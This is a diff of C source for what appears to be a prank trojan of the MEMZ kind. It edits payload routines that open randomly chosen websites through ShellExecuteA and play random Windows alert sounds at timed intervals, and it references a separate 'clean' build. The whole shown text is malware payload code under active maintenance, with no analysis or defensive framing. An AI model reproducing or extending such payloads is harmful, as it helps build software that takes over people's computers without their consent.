@@ -101,7 +101,7 @@ PAYLOADHOST(payloadHostVisual) {
 PAYLOADFUNCTIONDEFAULT(payloadExecute) {
 	PAYLOADHEAD
 
-	ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);
+	ShellExecuteA(NULL, "open", (LPCSTR)Sites[random() % SitesLen], NULL, NULL, SW_SHOWDEFAULT);
 
 	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
 }
@@ -180,6 +180,12 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 
+const char *sounds[] = {
+	"SystemHand",
+	"SystemQuestion",
+	"SystemExclamation"
+};
+
 PAYLOADFUNCTIONDEFAULT(payloadSound) {
 	PAYLOADHEAD
 
@@ -188,10 +194,10 @@ PAYLOADFUNCTIONDEFAULT(payloadSound) {
 	// But the sound is not not as fast as before. I hope there is another way to fix it without slowing down the payload.
 	// As this only happens for the enable-disable part, I will only include that in the clean build as a workaround.
 #ifdef CLEAN
-	PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
+	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_SYNC);
 	out: return random() % 10;
 #else
-	PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
+	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_ASYNC);
 	out: return 20 + (random() % 20);
 #endif
 }
